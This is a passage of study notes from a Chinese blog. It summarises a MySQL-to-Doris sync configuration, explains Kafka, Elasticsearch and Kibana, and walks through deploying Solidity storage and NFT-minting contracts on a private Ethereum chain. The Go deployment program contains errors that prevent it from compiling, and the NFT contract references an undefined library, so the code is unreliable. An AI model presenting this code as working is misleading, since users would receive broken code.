<p>源数据库（source）是 MySQL，连接信息包括主机名（localhost）、端口（3306）、用户名（root）、密码（123456）、表（app_db下的所有表）、服务器ID（5400-5404）和服务器时区（UTC）。<br>目标数据库（sink）是 Doris，连接信息包括FE节点（127.0.0.1:8030）、用户名（root）、密码（空字符串，即没有密码）、表创建属性（包括轻量模式变更和复制数等设置）。<br>Pipeline 部分定义了数据同步任务的名称（Sync MySQL Database to Doris）和并行度（2）。</p>
<h2><span id="kafka">Kafka</span></h2><p>Kafka 是由 Linkedin 公司开发的，它是一个分布式的，支持多分区、多副本，基于 Zookeeper 的分布式消息流平台，它同时也是一款开源的基于发布订阅模式的消息引擎系统。</p>
<h3><span id="主要术语">主要术语</span></h3><p>以下文段摘录于 <a href="https://kafka.apache.org/intro">kafka</a> 官方。</p>
<p>An <em>event</em> records the fact that “something happened” in the world or in your business. It is also called record or message in the documentation. When you read or write data to Kafka, you do this in the form of events. Conceptually, an event has a <em>key</em>, <em>value</em>, <em>timestamp</em>, and <em>optional metadata headers</em>.<br>An example：</p>
<ul>
<li>key：“Alice”</li>
<li>value：“向 Bob 支付了 200 美元”</li>
<li>timestamp：“2020 年 6 月 25 日下午 2：06”。</li>
</ul>
<p><em>Producers</em> are those client applications that publish (write) events to Kafka, and <em>consumers</em> are those that subscribe to (read and process) these events. </p>
<img data-src="/2024/03/28/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%AE%AD%E8%B0%83%E7%A0%94/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85.png" class title="生产者-消费者模式">

<p>Events are organized and durably stored in <em>topics</em>. A topic is similar to a folder in a filesystem, and the events are the files in that folder. Topics in Kafka are always <strong>multi-producer and multi-subscriber</strong>.</p>
<p>Topics are partitioned, meaning a topic is spread over a number of “buckets” located on different Kafka brokers. </p>
<p>Kafka 保证具有相同 Key 的事件写入被同一分区，读取时按写入顺序读。但是 Kafka <strong>不保证</strong>不同 Partition 获取的信息是有序的，只保证同 Partition 内消息有序。</p>
<img data-src="/2024/03/28/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%AE%AD%E8%B0%83%E7%A0%94/Kafka.png" class title="分区示意图">

<h3><span id="快速入门-kafka">快速入门 Kafka</span></h3><p><a href="https://kafka.apache.org/quickstart">快速入门</a></p>
<h3><span id="kafka-和-rabbitmq-的区别">Kafka 和 RabbitMQ 的区别</span></h3><table>
<thead>
<tr>
<th>特性</th>
<th>RabbitMQ</th>
<th>Kafka</th>
</tr>
</thead>
<tbody><tr>
<td>架构</td>
<td>RabbitMQ 的架构专为复杂的消息路由而设计。该代理使用推送模型。生产者使用不同的规则向使用者发送消息。</td>
<td>Kafka 使用基于分区的设计进行实时、高吞吐量的流处理。该代理使用拉取模型。生产者向使用者订阅的主题和分区发布消息。</td>
</tr>
<tr>
<td>消息处理</td>
<td>RabbitMQ 代理监控消息使用。此代理会在消息被使用后将其删除。它支持消息优先级。</td>
<td>使用者使用偏移跟踪器跟踪消息检索情况。Kafka 根据保留策略保留消息。其中没有消息优先级。</td>
</tr>
<tr>
<td>性能</td>
<td>RabbitMQ 提供低延迟。它每秒发送数千条消息。</td>
<td>Kafka 每秒可实时传输多达数百万条消息。</td>
</tr>
<tr>
<td>编程语言</td>
<td>RabbitMQ 支持多种语言和旧式协议。</td>
<td>Kafka 的编程语言选择有限。该代理在 TCP 上使用二进制协议进行数据传输。</td>
</tr>
</tbody></table>
<h2><span id="elasticsearch">ElasticSearch</span></h2><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/documents-indices.html">Elasticsearch</a> is a distributed document store. Instead of storing information as rows of columnar data, Elasticsearch stores complex data structures that have been serialized as JSON documents.</p>
<p>Elasticsearch REST API 支持结构化查询、全文查询和将两者结合在一起的查询的复杂查询 </p>
<p>和普通的数据库模糊搜索不同，<em>Elasticsearch</em> 的模糊搜索是能使用上索引的，所以在大数据场景下搜索速度快；而且，<em>Elasticsearch</em> 的模糊搜索支持排序，只返回排名高的记录；另外，<em>Elasticsearch</em> 的模糊搜索在遇到不太准确的关键字时也能搜出相关结果。</p>
<h2><span id="kibana">Kibana</span></h2><p><a href="https://www.elastic.co/guide/en/kibana/current/introduction.html">Kibana</a> enables you to give shape to your data and navigate the Elastic Stack</p>
<h3><span id="kibana-和-elasticsearch-关系">Kibana 和 ElasticSearch 关系</span></h3><p>Kibana 运行在 Elasticsearch 之上，主要用于分析日志消息。</p>
]]></content>
      <categories>
        <category>学习</category>
        <category>综合实训</category>
      </categories>
  </entry>
  <entry>
    <title>以太坊私链部署智能合约</title>
    <url>/2024/03/30/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<h2><span id="编写智能合约">编写智能合约</span></h2><p>以下编写了一个简单的存储智能合约，不是 <em>NFT</em> 智能合约。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint storedData;</span><br><span class="line"></span><br><span class="line">    function set(uint x) public &#123;</span><br><span class="line">        storedData = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() public view returns (uint) &#123;</span><br><span class="line">        return storedData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function add(uint x) public &#123;</span><br><span class="line">        uint y = x + storedData;</span><br><span class="line">        storedData = y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="编译智能合约">编译智能合约</span></h2><p>在 <em>Remix</em> 上compile刚刚写好的智能合约，然后会出现以下界面，ABI 和 Bytecode 待会需要用到  </p>
<img data-src="/2024/03/30/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image.png" class>

<h2><span id="部署智能合约">部署智能合约</span></h2><p>这里实现两种部署智能合约的方式，一种是在 geth 控制台部署，一种是使用 Go 实现</p>
<h3><span id="geth-控制台部署">geth 控制台部署</span></h3><p>1、解锁账户<br>24-4-15 更新: personal.unlockAccount 被弃用，且新方法不需要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">personal.unlockAccount(eth.coinbase)</span><br></pre></td></tr></table></figure>

<p>2、录入智能合约的 bytecode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var code = &quot;0x&quot; +  &quot;608060405234801561001057600080fd5b50610218806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80631003e2d21461004657806360fe47b1146100625780636d4ce63c1461007e575b600080fd5b610060600480360381019061005b9190610106565b61009c565b005b61007c60048036038101906100779190610106565b6100b8565b005b6100866100c2565b6040516100939190610142565b60405180910390f35b60008054826100ab919061018c565b9050806000819055505050565b8060008190555050565b60008054905090565b600080fd5b6000819050919050565b6100e3816100d0565b81146100ee57600080fd5b50565b600081359050610100816100da565b92915050565b60006020828403121561011c5761011b6100cb565b5b600061012a848285016100f1565b91505092915050565b61013c816100d0565b82525050565b60006020820190506101576000830184610133565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610197826100d0565b91506101a2836100d0565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156101d7576101d661015d565b5b82820190509291505056fea2646970667358221220cbc928270d8a2ea9cd6f6c4b97793588c6a480da09388d19c6fb1f05d75e718464736f6c634300080f0033&quot;</span><br></pre></td></tr></table></figure>

<p>3、录入智能合约的 ABI<br>ABI 需要先经过压缩转义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var abi=JSON.parse(&#x27;[&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;x\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;add\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[],\&quot;name\&quot;:\&quot;get\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;x\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;set\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;]&#x27;)</span><br></pre></td></tr></table></figure>

<p>4、部署智能合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var gas = eth.estimateGas(&#123;data: code&#125;) //先估算需要多大的gas</span><br><span class="line">//创建智能合约类</span><br><span class="line">var myContract = eth.contract(abi)</span><br><span class="line">//创建部署智能合约的交易</span><br><span class="line">var deploymentTx = &#123;from: &#x27;0x890fb1799fe7fa4b8e01ccf343e088d946fcd556&#x27;, data: code, gas: gas&#125;;</span><br><span class="line">//创建合约实例</span><br><span class="line">var myContractInstance = myContract.new(deploymentTx)</span><br></pre></td></tr></table></figure>
<p>创建成功后，控制台中会出现以下提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INFO [04-15|11:43:39.794] Submitted contract creation              hash=0xf2503d2c684283a9afb6ab47233a4f2fb01f156135c429586b924a0756d0a8d8 from=0x890fb1799Fe7fA4b8E01Ccf343e088D946fCd556 nonce=1 contract=0xa5D8278723e8808151c2066198619fc02818b526 value=0</span><br></pre></td></tr></table></figure>

<p>在控制台输入 myContractInstance，能获得以下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  abi: [&#123;</span><br><span class="line">      inputs: [&#123;...&#125;],</span><br><span class="line">      name: &quot;add&quot;,</span><br><span class="line">      outputs: [],</span><br><span class="line">      stateMutability: &quot;nonpayable&quot;,</span><br><span class="line">      type: &quot;function&quot;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">      inputs: [],</span><br><span class="line">      name: &quot;get&quot;,</span><br><span class="line">      outputs: [&#123;...&#125;],</span><br><span class="line">      stateMutability: &quot;view&quot;,</span><br><span class="line">      type: &quot;function&quot;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">      inputs: [&#123;...&#125;],</span><br><span class="line">      name: &quot;set&quot;,</span><br><span class="line">      outputs: [],</span><br><span class="line">      stateMutability: &quot;nonpayable&quot;,</span><br><span class="line">      type: &quot;function&quot;</span><br><span class="line">  &#125;],</span><br><span class="line">  address: undefined,</span><br><span class="line">  transactionHash: &quot;0x727fb18ce42f5f368a349908eee34eb36ae1e3c7fd2cb4f280db8b0ed44de6de&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>24-4-10 更新: 在输入第一行命令的时候，发现报以下错误。原因: PUSH0 opcode 是在 solidity 0.8.20 被引入的，而私链由于还未到 Shanghai 硬分叉，此时还不支持 PUSH0 opcode</p>
<img data-src="/2024/03/30/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/bug1.png" class>

<p>5、启动节点挖矿<br>因为在私链上没有其他节点挖矿，而部署智能合约也是一笔交易，所以需要节点挖矿使这笔交易打包上链，智能合约才部署成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">miner.start()</span><br><span class="line">miner.stop()</span><br></pre></td></tr></table></figure>

<p>6、调用智能合约<br>第一种调用用于需要花费 gas 的函数，第二种则用于不需要花费 gas 的函数，第一种调用由于也是一笔交易，所以需要节点挖矿上链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract.function_name.sendTransaction(&quot;parameter_1&quot;,&quot;parameter_2&quot;,&#123;from:&quot;account_address&quot;&#125;)</span><br><span class="line">contract.function_name.call(&quot;parameter_1&quot;,&quot;parameter_2&quot;)</span><br></pre></td></tr></table></figure>

<h3><span id="使用-go-部署">使用 Go 部署</span></h3><p>这里想要实现的效果是，每次新创建一个账户的时候，都会自动部署该智能合约，这一功能用 Go 实现。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;math/big&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/ethereum/go-ethereum/accounts/abi&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ethereum/go-ethereum/accounts/abi/bind&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ethereum/go-ethereum/common&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ethereum/go-ethereum/crypto&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将智能合约的ABI复制到这里，需要先经过压缩转义</span></span><br><span class="line"><span class="keyword">var</span> contractABI = <span class="string">&quot;</span></span><br><span class="line"><span class="string">[&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;x\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;add\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[],\&quot;name\&quot;:\&quot;get\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;x\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;set\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Geth 节点的 HTTP-RPC 地址</span></span><br><span class="line">    rpcURL := <span class="string">&quot;http://localhost:8545&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建新账户的密码</span></span><br><span class="line">    newPassword := <span class="string">&quot;your_password&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 JSON-RPC 请求体，创建新账户</span></span><br><span class="line">    payload := strings.NewReader(<span class="string">`&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;personal_newAccount&quot;,&quot;params&quot;:[&quot;`</span> + newPassword + <span class="string">`&quot;],&quot;id&quot;:1&#125;`</span>)</span><br><span class="line">    resp, err := http.Post(rpcURL, <span class="string">&quot;application/json&quot;</span>, payload)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析创建新账户的响应</span></span><br><span class="line">    <span class="keyword">var</span> newAccountResp <span class="keyword">struct</span> &#123;</span><br><span class="line">        Result <span class="type">string</span> <span class="string">`json:&quot;result&quot;`</span></span><br><span class="line">        Error  *<span class="keyword">struct</span> &#123;</span><br><span class="line">            Message <span class="type">string</span> <span class="string">`json:&quot;message&quot;`</span></span><br><span class="line">        &#125; <span class="string">`json:&quot;error&quot;`</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := json.NewDecoder(resp.Body).Decode(&amp;newAccountResp); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> newAccountResp.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;Failed to create new account: %s&quot;</span>, newAccountResp.Error.Message)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析新账户地址</span></span><br><span class="line">    newAccountAddress := common.HexToAddress(newAccountResp.Result)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;New account address: %s\n&quot;</span>, newAccountAddress.Hex())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到本地的 Geth 节点</span></span><br><span class="line">    client, err := rpc.Dial(rpcURL)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> client.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前 gas 价格</span></span><br><span class="line">    <span class="keyword">var</span> gasPrice *big.Int</span><br><span class="line">    <span class="keyword">if</span> err := client.CallContext(context.Background(), &amp;gasPrice, <span class="string">&quot;eth_gasPrice&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 部署智能合约</span></span><br><span class="line">    auth := bind.NewKeyedTransactor(newAccountAddress.Hex())</span><br><span class="line">    auth.Value = big.NewInt(<span class="number">0</span>)           <span class="comment">// 部署时发送的以太币数量</span></span><br><span class="line">    auth.GasLimit = <span class="type">uint64</span>(<span class="number">3000000</span>)      <span class="comment">// 指定 gas 限制</span></span><br><span class="line">    auth.GasPrice = gasPrice              <span class="comment">// 使用当前 gas 价格</span></span><br><span class="line">    input := <span class="string">&quot;0x&quot;</span> + <span class="string">&quot;6080604052348015600e575f80fd5b506101e48061001c5f395ff3fe608060405234801561000f575f80fd5b506004361061003f575f3560e01c80631003e2d21461004357806360fe47b11461005f5780636d4ce63c1461007b575b5f80fd5b61005d600480360381019061005891906100fb565b610099565b005b610079600480360381019061007491906100fb565b6100b3565b005b6100836100bc565b6040516100909190610135565b60405180910390f35b5f8054826100a7919061017b565b9050805f819055505050565b805f8190555050565b5f8054905090565b5f80fd5b5f819050919050565b6100da816100c8565b81146100e4575f80fd5b50565b5f813590506100f5816100d1565b92915050565b5f602082840312156101105761010f6100c4565b5b5f61011d848285016100e7565b91505092915050565b61012f816100c8565b82525050565b5f6020820190506101485f830184610126565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610185826100c8565b9150610190836100c8565b92508282019050808211156101a8576101a761014e565b5b9291505056fea26469706673582212209645cec1c57b3e0ea64b23d942988cdc634242f2c015ac31b32aa6ddac78ade164736f6c63430008190033&quot;</span></span><br><span class="line">    address, tx, _, err := bind.DeployContract(auth, abi.JSON(contractABI), common.FromHex(input), client)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Contract address: %s\n&quot;</span>, address.Hex())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待智能合约部署完成</span></span><br><span class="line">    _, err = bind.WaitDeployed(context.Background(), client, tx)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// // 输出新创建的账户地址和私钥</span></span><br><span class="line">    <span class="comment">// fmt.Printf(&quot;New account address: %s\n&quot;, newAccountAddress.Hex())</span></span><br><span class="line">    <span class="comment">// fmt.Printf(&quot;Private key: %x\n&quot;, crypto.FromECDSA(privateKey))</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2><span id="调用智能合约">调用智能合约</span></h2><h3><span id="安装-abigen-工具">安装 abigen 工具</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go get -u github.com/ethereum/go-ethereum</span><br></pre></td></tr></table></figure>

<h3><span id="生成合约绑定代码">生成合约绑定代码</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">abigen --sol SimpleStorage.sol --pkg main --out SimpleStorage.go</span><br></pre></td></tr></table></figure>

<h3><span id="在-main-函数中添加智能合约绑定和调用智能合约">在 main 函数中添加智能合约绑定和调用智能合约</span></h3><p>NewSimpleStorage 不是一个标准函数，而是在使用 abigen 时创建的一个函数，用于创建智能合约的绑定对象</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建智能合约绑定</span></span><br><span class="line">contract, err := NewSimpleStorage(address, client)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用智能合约的 get 函数</span></span><br><span class="line">result, err := contract.Get(<span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;Result of get function: %s\n&quot;</span>, result.String())</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>简单的NFT铸造智能合约</title>
    <url>/2024/04/17/%E7%AE%80%E5%8D%95%E7%9A%84NFT%E9%93%B8%E9%80%A0%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<h3><span id="代码">代码</span></h3><p>以下将展示一个简单的 NFT 铸造智能合约 (忽略交易相关的函数)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0;</span><br><span class="line"></span><br><span class="line">// ERC 165 标准接口</span><br><span class="line">interface IERC165 &#123;&#125;</span><br><span class="line"></span><br><span class="line">// ERC 721 标准接口</span><br><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    function balanceOf(address owner) external view returns (uint balance);</span><br><span class="line"></span><br><span class="line">    function ownerOfTokenId(uint tokenId) external view returns (address owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC721 is IERC721 &#123;</span><br><span class="line">	</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    // Mapping from token ID to owner address</span><br><span class="line">    mapping(uint =&gt; address) private _owners;</span><br><span class="line"></span><br><span class="line">    // Mapping owner address to token count</span><br><span class="line">    mapping(address =&gt; uint) private _balances;</span><br><span class="line"></span><br><span class="line">	// 新的Mapping Mapping from tokenId to pictrue URL</span><br><span class="line">	mapping(uint256 =&gt; string) private _tokenURLs;</span><br><span class="line"></span><br><span class="line">    // New mapping to map URL to token ID</span><br><span class="line">    mapping(string =&gt; uint256) private _urlToTokenId;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256[]) private _ownedTokens;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; string[]) private _ownedURLs;</span><br><span class="line">	</span><br><span class="line">	// 新的事件，当设置tokenURL时触发</span><br><span class="line">	event TokenURLSet(uint256 indexed tokenId, string url);</span><br><span class="line"></span><br><span class="line">    // 私有函数_mint实现通过address和tokenId铸造NFT</span><br><span class="line">    function _mint(address to, uint tokenId) private &#123;</span><br><span class="line">        require(to != address(0), &quot;mint to zero address&quot;);</span><br><span class="line">        require(_owners[tokenId] == address(0), &quot;token already minted&quot;);</span><br><span class="line"></span><br><span class="line">        _balances[to] += 1;</span><br><span class="line">        _owners[tokenId] = to;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	// 新的内部函数来设置tokenURL</span><br><span class="line">    function _setTokenURL(uint256 tokenId, string memory tokenURI) internal &#123;</span><br><span class="line">        require(_exists(tokenId), &quot;URL set of nonexistent token&quot;);</span><br><span class="line">        _tokenURLs[tokenId] = tokenURI;</span><br><span class="line">        emit TokenURLSet(tokenId, tokenURI);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	// 铸造NFT的mint函数接受address和图片URL实现铸造</span><br><span class="line">    function mint(address to, string memory tokenURI) public &#123;</span><br><span class="line">        // 通过图片URL的哈希值计算tokenId的哈希值</span><br><span class="line">        bytes32 hash = keccak256(abi.encodePacked(tokenURI));</span><br><span class="line">        uint256 newTokenId = uint256(hash);</span><br><span class="line"></span><br><span class="line">        // 调用_mint函数来铸造代币</span><br><span class="line">        _mint(to, newTokenId);</span><br><span class="line"></span><br><span class="line">        // 设置tokenURL和tokenId</span><br><span class="line">        _setTokenURL(newTokenId, tokenURI);</span><br><span class="line">        _urlToTokenId[tokenURI] = newTokenId;</span><br><span class="line">        _ownedTokens[to].push(newTokenId);</span><br><span class="line">        _ownedURLs[to].push(tokenURI);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	// 新的函数根据tokenId来获取tokenURL</span><br><span class="line">    function getURLbyTokeId(uint256 tokenId) public view returns (string memory) &#123;</span><br><span class="line">        require(_exists(tokenId), &quot;URL query for nonexistent token&quot;);</span><br><span class="line">        return _tokenURLs[tokenId];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 新的函数根据URL来获取tokenId</span><br><span class="line">    function getTokenIdByUrl(string memory tokenURI) public view returns (uint256) &#123;</span><br><span class="line">        uint256 tokenId = _urlToTokenId[tokenURI];</span><br><span class="line">        require(_exists(tokenId), &quot;Token with this URL does not exist&quot;);</span><br><span class="line"></span><br><span class="line">        return tokenId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 销毁NFT</span><br><span class="line">    function burn(uint256 tokenId) external &#123;</span><br><span class="line">        address owner = ownerOfTokenId(tokenId);</span><br><span class="line">        require(msg.sender == owner, &quot;not owner of token&quot;);</span><br><span class="line"></span><br><span class="line">        _balances[owner] -= 1;</span><br><span class="line">        delete _owners[tokenId];</span><br><span class="line"></span><br><span class="line">        // 从_tokenURLs中删除对应的tokenURL</span><br><span class="line">        string memory tokenURL = _tokenURLs[tokenId];</span><br><span class="line">        delete _tokenURLs[tokenId];</span><br><span class="line">        delete _urlToTokenId[tokenURL];</span><br><span class="line"></span><br><span class="line">        // 从_owners的tokenId数组中移除tokenId</span><br><span class="line">        uint256[] storage ownedTokens = _ownedTokens[owner];</span><br><span class="line">        for (uint256 i = 0; i &lt; ownedTokens.length; i++) &#123;</span><br><span class="line">            if (ownedTokens[i] == tokenId) &#123;</span><br><span class="line">                ownedTokens[i] = ownedTokens[ownedTokens.length - 1];</span><br><span class="line">                ownedTokens.pop();</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 从_owners的tokenURL数组中移除tokenURL</span><br><span class="line">        string[] storage ownedURLs = _ownedURLs[owner];</span><br><span class="line">        for (uint256 i = 0; i &lt; ownedURLs.length; i++) &#123;</span><br><span class="line">            if (keccak256(abi.encodePacked(ownedURLs[i])) == keccak256(abi.encodePacked(tokenURL))) &#123;</span><br><span class="line">                ownedURLs[i] = ownedURLs[ownedURLs.length - 1];</span><br><span class="line">                ownedURLs.pop();</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 私有函数，用于检查代币是否存在</span><br><span class="line">    function _exists(uint256 tokenId) private view returns (bool) &#123;</span><br><span class="line">        return _owners[tokenId] != address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取Owner总共有多少token</span><br><span class="line">    function balanceOf(address owner) external view override returns (uint) &#123;</span><br><span class="line">        require(owner != address(0), &quot;owner = zero address&quot;);</span><br><span class="line">        return _balances[owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 根据tokenId判断Owner</span><br><span class="line">    function ownerOfTokenId(uint tokenId) public view override returns (address owner) &#123;</span><br><span class="line">        owner = _owners[tokenId];</span><br><span class="line">        require(owner != address(0), &quot;token doesn&#x27;t exist&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 根据URL判断Owner</span><br><span class="line">    function ownerOfURL(string memory tokenURI) public view returns (address) 